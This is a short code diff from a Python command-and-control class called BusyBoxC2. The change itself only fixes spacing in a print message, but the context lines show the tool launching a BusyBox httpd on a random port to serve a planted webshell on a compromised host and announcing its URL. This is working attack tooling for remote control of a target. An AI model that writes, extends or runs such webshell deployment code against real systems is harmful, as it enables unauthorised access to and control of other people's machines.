@@ -163,7 +163,7 @@ class BusyBoxC2:
         webserver_port = random.randint(1024, 65534)
         cmd = "httpd -p " + str(webserver_port) + " -c " + webshell_destination_path + "httpd.conf -h " + webshell_destination_path
         self._send_cmd(cmd)
-        print(f"[*]Your webshell is ready on http://{self.server_ip}:{webserver_port}/index.php")
+        print(f"[*] Your webshell is ready on http://{self.server_ip}:{webserver_port}/index.php")
 
     def run(self):
         try:
